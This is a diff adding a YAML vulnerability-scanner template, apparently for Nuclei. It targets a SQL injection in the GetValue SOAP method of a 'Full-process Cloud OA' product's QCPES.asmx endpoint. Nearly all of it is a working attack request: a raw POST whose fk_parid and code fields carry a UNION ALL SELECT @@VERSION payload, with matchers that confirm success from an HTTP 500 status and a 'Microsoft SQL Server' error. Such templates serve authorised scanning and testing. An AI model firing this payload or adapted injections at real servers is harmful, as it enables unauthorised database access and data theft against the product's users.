@@ -1,0 +1,32 @@
+id: Full-process-Cloud-OA-QCPES-sqli
+info:
+  name: Full-process-Cloud-OA-QCPES-sqli
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        POST /OA/PES/QCPES.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 441
+        SOAPAction: "http://tempuri.org/GetValue"
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetValue xmlns="http://tempuri.org/">
+              <fk_parid>1' UNION ALL SELECT @@VERSION-- oCWH</fk_parid>
+              <code>1' UNION ALL SELECT @@VERSION-- oCWH</code>
+            </GetValue>
+          </soap:Body>
+        </soap:Envelope>
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - Microsoft SQL Server
+    matchers-condition: and
